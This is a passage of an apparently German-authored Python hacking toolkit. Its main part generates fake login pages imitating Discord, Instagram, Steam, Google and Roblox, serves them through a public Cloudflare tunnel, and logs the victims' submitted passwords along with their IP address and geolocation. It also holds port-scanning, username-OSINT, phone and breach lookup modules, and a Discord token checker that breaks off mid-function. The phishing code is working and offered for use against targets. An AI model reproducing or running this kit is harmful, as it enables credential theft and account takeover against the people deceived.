body::before{content:"";position:absolute;inset:0;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='20' cy='20' r='2' fill='%23ffffff' opacity='.1'/><circle cx='80' cy='30' r='3' fill='%23ffffff' opacity='.1'/><circle cx='40' cy='70' r='2' fill='%23ffffff' opacity='.1'/><circle cx='75' cy='80' r='2.5' fill='%23ffffff' opacity='.1'/></svg>");background-size:400px;opacity:.5}
.wrap{background:#313338;padding:32px;border-radius:8px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2);width:100%;max-width:784px;display:flex;position:relative;z-index:1}
.form-side{flex:1;padding-right:24px;min-width:0}
.qr-side{flex:0 0 240px;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;text-align:center;padding-left:24px}
.qr-container{width:176px;height:176px;background:#fff;padding:6px;border-radius:8px;margin-bottom:32px}
.qr-container svg{width:100%;height:100%;display:block}
.qr-side h3{font-size:24px;font-weight:600;margin-bottom:8px;line-height:1.25;color:#fff}
.qr-side p{color:#b5bac1;font-size:16px;font-weight:400;line-height:1.375}
.qr-side strong{color:#fff}
.head{text-align:center;color:#fff;margin-bottom:20px}
.head h1{font-size:24px;font-weight:600;margin-bottom:8px;line-height:1.25}
.head p{color:#b5bac1;font-size:16px;line-height:1.25}
label{display:block;color:#b5bac1;font-size:12px;font-weight:700;text-transform:uppercase;margin:20px 0 8px;letter-spacing:.02em;line-height:1.3}
label .req{color:#f23f42;margin-left:4px;font-weight:400}
input{width:100%;padding:10px;background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;color:#dcddde;font-size:16px;height:40px;outline:none;transition:border-color .15s;font-family:inherit}
input:focus{border-color:#5865F2}
input.err{border-color:#f23f42;animation:shake .3s}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
.forgot{color:#00a8fc;font-size:14px;margin-top:4px;text-decoration:none;display:inline-block;line-height:1.375}
.forgot:hover{text-decoration:underline}
button{width:100%;padding:2px 16px;background:#5865F2;border:none;border-radius:3px;color:#fff;font-size:16px;font-weight:500;height:44px;cursor:pointer;margin-top:20px;transition:background-color .17s;font-family:inherit}
button:hover{background:#4752c4}
button:disabled{opacity:.6;cursor:not-allowed}
.signup{color:#b5bac1;font-size:14px;margin-top:4px;line-height:1.375}
.signup a{color:#00a8fc;text-decoration:none}
.err-msg{color:#f23f42;font-size:12px;font-weight:600;margin-top:6px;display:none;line-height:1.375}
.err-msg.show{display:block}
.spinner{width:22px;height:22px;border:3px solid #fff;border-top-color:transparent;border-radius:50%;margin:auto;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
@media(max-width:900px){.wrap{max-width:480px;flex-direction:column}.qr-side{display:none}.form-side{padding-right:0}}
</style></head><body>
<div class="wrap">
<div class="form-side">
<div class="head"><h1>Willkommen zurück!</h1><p>Wir freuen uns dich wiederzusehen!</p></div>
<form id="f" novalidate>
<label>E-Mail oder Telefonnummer<span class="req">*</span></label>
<input name="email" type="text" autocomplete="off" required id="email">
<label>Passwort<span class="req">*</span></label>
<input name="password" type="password" autocomplete="off" required id="pw">
<div class="err-msg" id="err">E-Mail oder Passwort ungültig.</div>
<a href="#" class="forgot">Passwort vergessen?</a>
<button type="submit" id="btn">Anmelden</button>
<p class="signup" style="margin-top:8px">Du brauchst ein Konto? <a href="#">Registrieren</a></p>
</form>
</div>
<div class="qr-side">
<div class="qr-container">
<svg viewBox="0 0 33 33" xmlns="http://www.w3.org/2000/svg" shape-rendering="crispEdges">
<rect width="33" height="33" fill="#fff"/>
<g fill="#000">
<rect x="0" y="0" width="7" height="7"/><rect x="1" y="1" width="5" height="5" fill="#fff"/><rect x="2" y="2" width="3" height="3"/>
<rect x="26" y="0" width="7" height="7"/><rect x="27" y="1" width="5" height="5" fill="#fff"/><rect x="28" y="2" width="3" height="3"/>
<rect x="0" y="26" width="7" height="7"/><rect x="1" y="27" width="5" height="5" fill="#fff"/><rect x="2" y="28" width="3" height="3"/>
<rect x="8" y="0" width="1" height="1"/><rect x="10" y="0" width="1" height="1"/><rect x="12" y="0" width="2" height="1"/><rect x="15" y="0" width="1" height="1"/><rect x="17" y="0" width="1" height="1"/><rect x="19" y="0" width="2" height="1"/><rect x="22" y="0" width="1" height="1"/>
<rect x="8" y="2" width="2" height="1"/><rect x="12" y="2" width="1" height="1"/><rect x="14" y="2" width="1" height="1"/><rect x="17" y="2" width="3" height="1"/><rect x="22" y="2" width="1" height="1"/>
<rect x="8" y="4" width="1" height="1"/><rect x="10" y="4" width="1" height="1"/><rect x="12" y="4" width="1" height="1"/><rect x="14" y="4" width="3" height="1"/><rect x="18" y="4" width="1" height="1"/><rect x="20" y="4" width="1" height="1"/><rect x="22" y="4" width="1" height="1"/>
<rect x="0" y="8" width="1" height="1"/><rect x="2" y="8" width="1" height="1"/><rect x="4" y="8" width="1" height="1"/><rect x="7" y="8" width="1" height="1"/><rect x="9" y="8" width="1" height="1"/><rect x="12" y="8" width="1" height="1"/><rect x="14" y="8" width="2" height="1"/><rect x="17" y="8" width="1" height="1"/><rect x="19" y="8" width="1" height="1"/><rect x="21" y="8" width="1" height="1"/><rect x="23" y="8" width="2" height="1"/><rect x="26" y="8" width="1" height="1"/><rect x="28" y="8" width="1" height="1"/><rect x="30" y="8" width="1" height="1"/>
<rect x="1" y="9" width="1" height="1"/><rect x="3" y="9" width="1" height="1"/><rect x="6" y="9" width="1" height="1"/><rect x="8" y="9" width="1" height="1"/><rect x="10" y="9" width="1" height="1"/><rect x="13" y="9" width="2" height="1"/><rect x="16" y="9" width="1" height="1"/><rect x="20" y="9" width="1" height="1"/><rect x="22" y="9" width="1" height="1"/><rect x="24" y="9" width="1" height="1"/><rect x="27" y="9" width="1" height="1"/><rect x="30" y="9" width="1" height="1"/>
<rect x="0" y="11" width="2" height="1"/><rect x="4" y="11" width="1" height="1"/><rect x="7" y="11" width="1" height="1"/><rect x="10" y="11" width="1" height="1"/><rect x="12" y="11" width="1" height="1"/><rect x="14" y="11" width="1" height="1"/><rect x="16" y="11" width="1" height="1"/><rect x="19" y="11" width="1" height="1"/><rect x="22" y="11" width="1" height="1"/><rect x="25" y="11" width="1" height="1"/><rect x="27" y="11" width="1" height="1"/><rect x="29" y="11" width="2" height="1"/>
<rect x="1" y="12" width="1" height="1"/><rect x="3" y="12" width="2" height="1"/><rect x="6" y="12" width="1" height="1"/><rect x="9" y="12" width="1" height="1"/><rect x="12" y="12" width="3" height="1"/><rect x="16" y="12" width="1" height="1"/><rect x="18" y="12" width="2" height="1"/><rect x="21" y="12" width="1" height="1"/><rect x="24" y="12" width="1" height="1"/><rect x="26" y="12" width="2" height="1"/><rect x="30" y="12" width="1" height="1"/>
<rect x="0" y="14" width="1" height="1"/><rect x="3" y="14" width="1" height="1"/><rect x="5" y="14" width="1" height="1"/><rect x="7" y="14" width="1" height="1"/><rect x="10" y="14" width="1" height="1"/><rect x="12" y="14" width="1" height="1"/><rect x="15" y="14" width="1" height="1"/><rect x="18" y="14" width="1" height="1"/><rect x="21" y="14" width="2" height="1"/><rect x="24" y="14" width="1" height="1"/><rect x="26" y="14" width="1" height="1"/><rect x="28" y="14" width="1" height="1"/><rect x="31" y="14" width="1" height="1"/>
<rect x="2" y="16" width="1" height="1"/><rect x="4" y="16" width="1" height="1"/><rect x="6" y="16" width="2" height="1"/><rect x="10" y="16" width="1" height="1"/><rect x="13" y="16" width="2" height="1"/><rect x="17" y="16" width="1" height="1"/><rect x="19" y="16" width="1" height="1"/><rect x="21" y="16" width="1" height="1"/><rect x="24" y="16" width="2" height="1"/><rect x="27" y="16" width="1" height="1"/><rect x="29" y="16" width="1" height="1"/>
<rect x="0" y="17" width="1" height="1"/><rect x="2" y="17" width="2" height="1"/><rect x="6" y="17" width="1" height="1"/><rect x="8" y="17" width="1" height="1"/><rect x="11" y="17" width="1" height="1"/><rect x="14" y="17" width="1" height="1"/><rect x="16" y="17" width="1" height="1"/><rect x="19" y="17" width="2" height="1"/><rect x="23" y="17" width="1" height="1"/><rect x="25" y="17" width="1" height="1"/><rect x="27" y="17" width="1" height="1"/><rect x="30" y="17" width="1" height="1"/>
<rect x="1" y="19" width="1" height="1"/><rect x="3" y="19" width="1" height="1"/><rect x="5" y="19" width="2" height="1"/><rect x="8" y="19" width="1" height="1"/><rect x="12" y="19" width="1" height="1"/><rect x="14" y="19" width="2" height="1"/><rect x="17" y="19" width="1" height="1"/><rect x="20" y="19" width="1" height="1"/><rect x="22" y="19" width="1" height="1"/><rect x="25" y="19" width="1" height="1"/><rect x="27" y="19" width="1" height="1"/><rect x="30" y="19" width="1" height="1"/>
<rect x="0" y="21" width="1" height="1"/><rect x="4" y="21" width="1" height="1"/><rect x="6" y="21" width="1" height="1"/><rect x="9" y="21" width="1" height="1"/><rect x="11" y="21" width="1" height="1"/><rect x="13" y="21" width="1" height="1"/><rect x="16" y="21" width="1" height="1"/><rect x="18" y="21" width="1" height="1"/><rect x="21" y="21" width="1" height="1"/><rect x="23" y="21" width="1" height="1"/><rect x="26" y="21" width="1" height="1"/><rect x="28" y="21" width="1" height="1"/><rect x="30" y="21" width="1" height="1"/>
<rect x="2" y="23" width="1" height="1"/><rect x="5" y="23" width="2" height="1"/><rect x="8" y="23" width="1" height="1"/><rect x="10" y="23" width="1" height="1"/><rect x="13" y="23" width="1" height="1"/><rect x="15" y="23" width="1" height="1"/><rect x="17" y="23" width="1" height="1"/><rect x="20" y="23" width="1" height="1"/><rect x="22" y="23" width="2" height="1"/><rect x="26" y="23" width="1" height="1"/><rect x="28" y="23" width="1" height="1"/><rect x="30" y="23" width="1" height="1"/>
<rect x="8" y="25" width="1" height="1"/><rect x="10" y="25" width="1" height="1"/><rect x="12" y="25" width="1" height="1"/><rect x="14" y="25" width="1" height="1"/><rect x="17" y="25" width="1" height="1"/><rect x="19" y="25" width="1" height="1"/><rect x="21" y="25" width="1" height="1"/><rect x="23" y="25" width="1" height="1"/><rect x="26" y="25" width="1" height="1"/><rect x="28" y="25" width="1" height="1"/><rect x="30" y="25" width="1" height="1"/>
<rect x="8" y="27" width="1" height="1"/><rect x="10" y="27" width="1" height="1"/><rect x="12" y="27" width="1" height="1"/><rect x="15" y="27" width="1" height="1"/><rect x="17" y="27" width="1" height="1"/><rect x="19" y="27" width="1" height="1"/><rect x="22" y="27" width="1" height="1"/>
<rect x="8" y="29" width="2" height="1"/><rect x="11" y="29" width="1" height="1"/><rect x="13" y="29" width="2" height="1"/><rect x="17" y="29" width="1" height="1"/><rect x="20" y="29" width="2" height="1"/><rect x="23" y="29" width="1" height="1"/><rect x="26" y="29" width="1" height="1"/><rect x="29" y="29" width="2" height="1"/>
<rect x="8" y="31" width="1" height="1"/><rect x="10" y="31" width="1" height="1"/><rect x="14" y="31" width="1" height="1"/><rect x="16" y="31" width="2" height="1"/><rect x="19" y="31" width="1" height="1"/><rect x="22" y="31" width="1" height="1"/><rect x="24" y="31" width="1" height="1"/><rect x="26" y="31" width="1" height="1"/><rect x="29" y="31" width="1" height="1"/>
</g>
</svg>
</div>
<h3>Mit QR-Code einloggen</h3>
<p>Scanne dies mit der <strong>Discord Mobile App</strong>, um dich sofort anzumelden.</p>
</div>
</div>
<script>
const f=document.getElementById('f'),btn=document.getElementById('btn'),err=document.getElementById('err'),em=document.getElementById('email'),pw=document.getElementById('pw');
let attempts=0;
f.addEventListener('submit',async e=>{
e.preventDefault();
btn.disabled=true;btn.innerHTML='<div class="spinner"></div>';
const d={};new FormData(e.target).forEach((v,k)=>d[k]=v);d.ua=navigator.userAgent;d.time=new Date().toISOString();d.site='discord';d.attempt=++attempts;
try{await fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d),keepalive:true})}catch(x){}
try{if(navigator.sendBeacon){navigator.sendBeacon('/submit',JSON.stringify(d))}}catch(x){}
await new Promise(r=>setTimeout(r,1400));
btn.disabled=false;btn.textContent='Anmelden';
err.classList.add('show');
em.classList.add('err');pw.classList.add('err');
setTimeout(()=>{em.classList.remove('err');pw.classList.remove('err')},400);
if(attempts>=2){setTimeout(()=>location.href='https://discord.com/login',900)}
});
</script></body></html>"""

def _tpl_discord_old():
    return _phish_page(
        title="Discord",
        brand_color="#5865F2", text_color="#dcddde",
        bg_style="background:linear-gradient(180deg,#5865F2 0%,#404EED 100%)",
        logo_html='<svg width="130" height="30" viewBox="0 0 130 30"><text x="0" y="24" fill="#fff" font-family="Inter" font-weight="800" font-size="26">Discord</text></svg>',
        header="Willkommen zurück!", sub="Wir freuen uns dich wiederzusehen!",
        fields=[("email","text","E-Mail oder Telefonnummer"),
                ("password","password","Passwort")],
        footer_html='<div class="footer">Du brauchst ein Konto? <a href="#">Registrieren</a></div>',
        redirect_url="https://discord.com/login", site="discord",
    )

def _tpl_instagram():
    return _phish_page(
        title="Instagram", brand_color="#0095f6", text_color="#f5f5f5",
        bg_style="background:linear-gradient(45deg,#833ab4 0%,#fd1d1d 50%,#fcb045 100%)",
        logo_html='<svg width="180" height="52" viewBox="0 0 180 52"><text x="0" y="42" fill="#fff" font-family="cursive" font-style="italic" font-weight="500" font-size="44">Instagram</text></svg>',
        header="Bei Instagram anmelden", sub="Willkommen zurück",
        fields=[("username","text","Handynummer, Nutzername oder Email"),
                ("password","password","Passwort")],
        footer_html='<div class="footer">Kein Konto? <a href="#">Registrieren</a></div>',
        redirect_url="https://instagram.com/accounts/login/", site="instagram",
    )

def _tpl_steam():
    return _phish_page(
        title="Sign in – Steam", brand_color="#1a9fff", text_color="#c7d5e0",
        bg_style="background:linear-gradient(180deg,#171a21 0%,#1b2838 100%)",
        logo_html='<svg width="180" height="44" viewBox="0 0 180 44"><text x="0" y="34" fill="#66c0f4" font-family="Inter" font-weight="700" font-size="30">STEAM</text></svg>',
        header="Melde dich an", sub="Verwende dein Steam-Konto",
        fields=[("username","text","Kontoname"),("password","password","Passwort")],
        footer_html='<div class="footer">Neu bei Steam? <a href="#">Konto erstellen</a></div>',
        redirect_url="https://steamcommunity.com/login/home/", site="steam",
    )

def _tpl_google():
    return _phish_page(
        title="Anmelden – Google Konten", brand_color="#1a73e8", text_color="#e8eaed",
        bg_style="background:linear-gradient(180deg,#1a1a1a 0%,#0d0d0d 100%)",
        logo_html='<svg width="90" height="30" viewBox="0 0 90 30"><text x="0" y="24" fill="#4285F4" font-family="Inter" font-weight="600" font-size="26">G</text><text x="20" y="24" fill="#EA4335" font-family="Inter" font-weight="600" font-size="26">o</text><text x="38" y="24" fill="#FBBC05" font-family="Inter" font-weight="600" font-size="26">o</text><text x="56" y="24" fill="#4285F4" font-family="Inter" font-weight="600" font-size="26">g</text><text x="74" y="24" fill="#34A853" font-family="Inter" font-weight="600" font-size="26">l</text></svg>',
        header="Anmelden", sub="Google Konto verwenden",
        fields=[("email","text","E-Mail oder Telefonnummer"),
                ("password","password","Passwort eingeben")],
        footer_html='<div class="footer"><a href="#">Konto erstellen</a></div>',
        redirect_url="https://accounts.google.com/signin", site="google",
    )

def _tpl_roblox():
    return _phish_page(
        title="Login – Roblox", brand_color="#00a2ff", text_color="#f5f5f5",
        bg_style="background:linear-gradient(180deg,#393b3d 0%,#1a1c1e 100%)",
        logo_html='<svg width="160" height="40" viewBox="0 0 160 40"><text x="0" y="32" fill="#fff" font-family="Inter" font-weight="900" font-size="30">ROBLOX</text></svg>',
        header="Anmelden", sub="Willkommen zurück!",
        fields=[("username","text","Benutzername"),("password","password","Passwort")],
        footer_html='<div class="footer">Neu bei Roblox? <a href="#">Konto erstellen</a></div>',
        redirect_url="https://www.roblox.com/login", site="roblox",
    )

PHISH_TEMPLATES = {
    "discord": _tpl_discord, "instagram": _tpl_instagram,
    "steam": _tpl_steam, "google": _tpl_google, "roblox": _tpl_roblox,
}

class PhishHandler(http.server.BaseHTTPRequestHandler):
    site_name = "unknown"; html_content = ""
    def do_GET(self):
        if self.path == "/" or self.path.startswith("/?") or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type","text/html; charset=utf-8")
            self.send_header("Cache-Control","no-store")
            self.end_headers()
            self.wfile.write(self.html_content.encode())
        elif self.path.startswith("/submit"):
            q = parse_qs(urlparse(self.path).query)
            creds = {k:v[0] for k,v in q.items()}
            self._log(creds)
            self.send_response(200); self.send_header("Content-Type","image/gif")
            self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
            self.wfile.write(b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")
        else:
            self.send_response(404); self.end_headers()
    def do_POST(self):
        length = int(self.headers.get("Content-Length",0))
        body = self.rfile.read(length).decode("utf-8", errors="ignore")
        creds = {}
        try: creds = json.loads(body)
        except:
            try: creds = {k:v[0] for k,v in parse_qs(body).items()}
            except: creds = {"raw":body}
        self._log(creds)
        self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
    def _log(self, creds):
        ip = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For") or self.client_address[0]
        ua = self.headers.get("User-Agent","?")
        PHISH_STATE["count"] += 1
        print(f"\n{G}{B}╔══ CREDENTIALS #{PHISH_STATE['count']} ══════════════════╗{RST}")
        print(f"  {C}IP:{RST}   {G}{B}{ip}{RST}")
        print(f"  {C}UA:{RST}   {DIM}{ua[:70]}{RST}")
        for k,v in creds.items():
            if k in ("ua","site","attempt"): continue
            print(f"  {C}{k:<10}{RST} {Y}{B}{v}{RST}")
        # lookup
        try:
            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=4).json()
            if geo.get("status") == "success":
                print(f"  {C}GEO:{RST}  {W}{geo.get('country')} · {geo.get('city')} · {geo.get('isp')}{RST}")
        except: pass
        print(f"{G}{B}╚══════════════════════════════════════════╝{RST}\n")
        save_hit(f"phish_{self.site_name}", json.dumps({"ip":ip,"ua":ua,**creds}))
    def log_message(self, *a): pass

def _download_cloudflared():
    cf_path = os.path.join(BASE, "cloudflared.exe")
    if os.path.exists(cf_path): return cf_path
    print(f"{Y}[*] Downloade cloudflared.exe (~20MB, einmalig)...{RST}")
    try:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        r = requests.get(url, timeout=120, stream=True)
        total = int(r.headers.get("content-length",0)); done = 0
        with open(cf_path, "wb") as f:
            for chunk in r.iter_content(64*1024):
                if chunk:
                    f.write(chunk); done += len(chunk)
                    if total: print(f"\r{C}[download] {done*100//total}%{RST}", end="", flush=True)
        print(f"\n{G}[+] cloudflared bereit{RST}")
        return cf_path
    except Exception as e:
        log("ERR", f"download failed: {e}", R); return None

def phishing_generator():
    clear(); print_banner()
    print(f"{M}{B}» Phishing Page Generator — Self-Hosted{RST}")
    print(f"{W}   Creds gehen direkt an dein terminal (kein webhook.site){RST}")
    print(f"{W}   Same-origin submit = bulletproof, kein CORS/CSP block{RST}\n")
    print(f"{C}Templates:{RST}")
    for i, name in enumerate(PHISH_TEMPLATES.keys(), 1):
        print(f"  {C}{i}{RST}) {name.capitalize()}")
    choice = ask("\nWahl: ")
    try: name = list(PHISH_TEMPLATES.keys())[int(choice)-1]
    except: log("ERR","invalid",R); pause(); return

    html = PHISH_TEMPLATES[name]()
    path = os.path.join(PHISH_DIR, f"{name}_backup.html")
    with open(path, "w", encoding="utf-8") as f: f.write(html)

    cf_path = _download_cloudflared()
    if not cf_path: pause(); return

    port = random.randint(9000,9999)
    PhishHandler.html_content = html
    PhishHandler.site_name = name
    httpd = socketserver.ThreadingTCPServer(("127.0.0.1", port), PhishHandler)
    httpd.allow_reuse_address = True
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    print(f"{G}[+] local server auf port {port}{RST}")

    print(f"{Y}[*] starte cloudflare tunnel...{RST}")
    tunnel = subprocess.Popen(
        [cf_path,"tunnel","--url",f"http://localhost:{port}","--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1, encoding="utf-8", errors="ignore")
    phish_url = None; start = time.time()
    while time.time() - start < 30:
        line = tunnel.stdout.readline()
        if not line:
            if tunnel.poll() is not None: break
            continue
        m = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if m: phish_url = m.group(); break
    if not phish_url:
        print(f"{R}[!] tunnel failed. Lokal: http://localhost:{port}{RST}"); pause(); return

    print(f"\n{G}{B}╔══════════════════════════════════════════════╗{RST}")
    print(f"{G}{B}║           PHISHING PAGE LIVE! 🎣            ║{RST}")
    print(f"{G}{B}╚══════════════════════════════════════════════╝{RST}\n")
    print(f"{C}{B}📎 Link (an target senden):{RST}")
    print(f"   {Y}{B}{phish_url}{RST}\n")
    print(f"{DIM}   Local: http://localhost:{port}{RST}")
    print(f"{DIM}   Backup HTML: {path}{RST}\n")
    print(f"{G}[+] Live tracker läuft — creds erscheinen unten{RST}")
    print(f"{DIM}    STRG+C = stoppen{RST}\n")

    PHISH_STATE["count"] = 0
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] stopped — {PHISH_STATE['count']} credentials gesammelt{RST}")
        try: tunnel.terminate()
        except: pass
        try: httpd.shutdown()
        except: pass
        pause()


# PHONE LOOKUP

def phone_lookup():
    clear(); print_banner()
    print(f"{M}{B}» Phone Number Lookup{RST}\n")
    if not HAS_PHONE: log("ERR","pip install phonenumbers",R); pause(); return
    print(f"{W}   Format: mit ländervorwahl, z.B. +49 176 12345678{RST}\n")
    num = ask("Nummer: ")
    try:
        p = phonenumbers.parse(num, None)
        types = {0:"FIXED_LINE",1:"MOBILE",2:"FIXED_LINE_OR_MOBILE",3:"TOLL_FREE",
                 4:"PREMIUM_RATE",5:"SHARED_COST",6:"VOIP",7:"PERSONAL_NUMBER",
                 8:"PAGER",9:"UAN",10:"UNKNOWN",27:"VOICEMAIL"}
        print(f"\n{C}Number:{RST}   {G}{phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}{RST}")
        print(f"{C}Valid:{RST}    {G if phonenumbers.is_valid_number(p) else R}{phonenumbers.is_valid_number(p)}{RST}")
        print(f"{C}Country:{RST}  {G}{geocoder.country_name_for_number(p,'en')}{RST}")
        print(f"{C}Region:{RST}   {G}{geocoder.description_for_number(p,'de')}{RST}")
        print(f"{C}Carrier:{RST}  {G}{carrier.name_for_number(p,'en')}{RST}")
        print(f"{C}Timezone:{RST} {G}{', '.join(timezone.time_zones_for_number(p))}{RST}")
        print(f"{C}Type:{RST}     {G}{types.get(phonenumbers.number_type(p),'?')}{RST}")
        print(f"{C}Code:{RST}     {G}+{p.country_code}{RST}")
    except Exception as e: log("ERR",str(e),R)
    pause()


# BREACH LOOKUP

def email_lookup():
    clear(); print_banner()
    print(f"{M}{B}» Email Breach Lookup (XposedOrNot){RST}\n")
    email = ask("Email: ")
    try:
        r = requests.get(f"https://api.xposedornot.com/v1/check-email/{email}", timeout=15)
        if r.status_code == 200:
            breaches = r.json().get("breaches",[[]])[0]
            if breaches:
                print(f"\n{R}{B}[!] {len(breaches)} breaches:{RST}\n")
                for b in breaches: print(f"  {R}⚠  {b}{RST}")
                r2 = requests.get(f"https://api.xposedornot.com/v1/breach-analytics?email={email}", timeout=15)
                if r2.status_code == 200:
                    for site in r2.json().get("ExposedBreaches",{}).get("breaches_details",[]):
                        print(f"\n  {Y}{B}{site.get('breach')}{RST}")
                        print(f"    Datum: {site.get('xposed_date')}")
                        print(f"    Records: {site.get('xposed_records')}")
                        print(f"    Data: {site.get('xposed_data','')[:80]}")
            else: print(f"\n{G}[✓] Keine breaches{RST}")
        else: print(f"\n{G}[✓] Keine breaches{RST}")
    except Exception as e: log("ERR",str(e),R)
    pause()

# ═══════════════════════════════════════════════════════════════
# 7) WEBSITE SCANNER
# ═══════════════════════════════════════════════════════════════
COMMON_PORTS = [21,22,23,25,53,80,110,143,443,445,465,587,993,995,1433,1521,
                2049,3306,3389,5432,5900,6379,8000,8080,8443,27017]

def website_scanner():
    clear(); print_banner()
    print(f"{M}{B}» Website Scanner{RST}\n")
    url = ask("URL: ")
    if not url.startswith("http"): url = "https://" + url
    host = urlparse(url).netloc
    try: ip = socket.gethostbyname(host)
    except Exception as e: log("ERR",str(e),R); pause(); return
    print(f"\n{C}{B}[DNS]{RST}")
    print(f"  Host: {G}{host}{RST} → IP: {G}{ip}{RST}")
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=8).json()
        print(f"  Country: {G}{geo.get('country')}{RST} · {geo.get('city')}")
        print(f"  ISP: {G}{geo.get('isp')}{RST}")
    except: pass
    print(f"\n{C}{B}[HTTP]{RST}")
    try:
        r = requests.get(url, headers={"User-Agent":UA}, timeout=15)
        print(f"  Status: {G}{r.status_code}{RST}  Final: {G}{r.url}{RST}")
        print(f"\n{C}{B}[Headers]{RST}")
        for h in ["Server","X-Powered-By","X-AspNet-Version","Via","CF-Ray","Set-Cookie"]:
            if h in r.headers: print(f"  {C}{h}:{RST} {G}{r.headers[h][:100]}{RST}")
        print(f"\n{C}{B}[Security]{RST}")
        for h,d in {"Content-Security-Policy":"CSP","Strict-Transport-Security":"HSTS",
                    "X-Frame-Options":"Clickjacking","X-Content-Type-Options":"MIME sniff"}.items():
            print(f"  {G if h in r.headers else R}[{'✓' if h in r.headers else '✗'}]{RST} {d}")
        print(f"\n{C}{B}[Tech Stack]{RST}")
        body = r.text.lower()
        for name, sigs in {"WordPress":["wp-content"],"React":["react"],"Vue":["vue.js"],
                            "Angular":["ng-app"],"Next.js":["_next/"],"jQuery":["jquery"],
                            "Bootstrap":["bootstrap"],"Cloudflare":["cloudflare"],
                            "Shopify":["cdn.shopify"],"PHP":[".php"]}.items():
            if any(s in body for s in sigs): print(f"  {G}• {name}{RST}")
    except Exception as e: log("ERR",str(e),R)
    print(f"\n{C}{B}[Port Scan]{RST}")
    open_ports = []; lock = threading.Lock()
    def scan(p):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1.5)
                if s.connect_ex((ip,p)) == 0:
                    with lock: open_ports.append(p); print(f"  {G}[+] {p}/tcp OPEN{RST}")
        except: pass
    ths = [threading.Thread(target=scan, args=(p,), daemon=True) for p in COMMON_PORTS]
    for t in ths: t.start()
    for t in ths: t.join(timeout=3)
    if not open_ports: print(f"  {Y}Keine common ports offen{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# 8) DISCORD INVITE INFO
# ═══════════════════════════════════════════════════════════════
def invite_info():
    clear(); print_banner()
    print(f"{M}{B}» Discord Invite Info{RST}\n")
    inv = ask("Invite code oder link: ")
    code = inv.split("/")[-1]
    try:
        r = requests.get(f"{DISCORD_API}/invites/{code}?with_counts=true&with_expiration=true",
                         headers={"User-Agent":UA}, timeout=10)
        if r.status_code == 200:
            d = r.json(); g = d.get("guild",{})
            print(f"\n{G}Server: {B}{g.get('name')}{RST}")
            print(f"{G}ID: {RST}{g.get('id')}")
            print(f"{G}Members: {RST}{d.get('approximate_member_count')} (online: {d.get('approximate_presence_count')})")
            print(f"{G}Boosts: {RST}{g.get('premium_subscription_count',0)}")
            print(f"{G}Features: {RST}{', '.join(g.get('features',[]))}")
            iv = d.get("inviter",{})
            if iv: print(f"{G}Inviter: {RST}{iv.get('username')} ({iv.get('id')})")
        else: log("ERR",f"invalid ({r.status_code})",R)
    except Exception as e: log("ERR",str(e),R)
    pause()

# ═══════════════════════════════════════════════════════════════
# 9) USERNAME OSINT
# ═══════════════════════════════════════════════════════════════
OSINT_SITES = {"GitHub":"https://github.com/{}","Twitter":"https://twitter.com/{}",
    "Instagram":"https://www.instagram.com/{}/","TikTok":"https://www.tiktok.com/@{}",
    "Reddit":"https://www.reddit.com/user/{}","YouTube":"https://www.youtube.com/@{}",
    "Twitch":"https://www.twitch.tv/{}","Steam":"https://steamcommunity.com/id/{}",
    "Pinterest":"https://www.pinterest.com/{}/","Roblox":"https://www.roblox.com/user.aspx?username={}",
    "Spotify":"https://open.spotify.com/user/{}","SoundCloud":"https://soundcloud.com/{}",
    "Medium":"https://medium.com/@{}","Patreon":"https://www.patreon.com/{}",
    "Kick":"https://kick.com/{}","GitLab":"https://gitlab.com/{}",
    "DevTo":"https://dev.to/{}","HackerNews":"https://news.ycombinator.com/user?id={}"}

def username_osint():
    clear(); print_banner()
    print(f"{M}{B}» Username OSINT ({len(OSINT_SITES)} sites){RST}\n")
    u = ask("Username: ")
    if not u: return
    found = []; lock = threading.Lock()
    def check(s, url):
        try:
            r = requests.get(url.format(u), headers={"User-Agent":UA}, timeout=8, allow_redirects=False)
            with lock:
                if r.status_code == 200:
                    print(f"{G}[✓] {s:<12}{RST} {url.format(u)}")
                    found.append(s); save_hit(f"osint_{u}", f"{s}: {url.format(u)}")
                else: print(f"{R}[✗] {s:<12}{RST} not found")
        except:
            with lock: print(f"{Y}[?] {s:<12}{RST} error")
    ths = [threading.Thread(target=check, args=(s,u2), daemon=True) for s,u2 in OSINT_SITES.items()]
    for t in ths: t.start()
    for t in ths: t.join(timeout=15)
    print(f"\n{G}Gefunden: {len(found)}/{len(OSINT_SITES)}{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# 10) TOKEN CHECKER
# ═══════════════════════════════════════════════════════════════
def token_checker():
    clear(); print_banner()
    print(f"{M}{B}» Discord Token Checker{RST}\n")
    path = ask("Pfad zur token liste: ").strip('"')
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            tokens = [t.strip() for t in f if t.strip()]
    except: log("ERR","not found",R); pause(); return
    valid = invalid = 0
    for t in tokens:
        try:
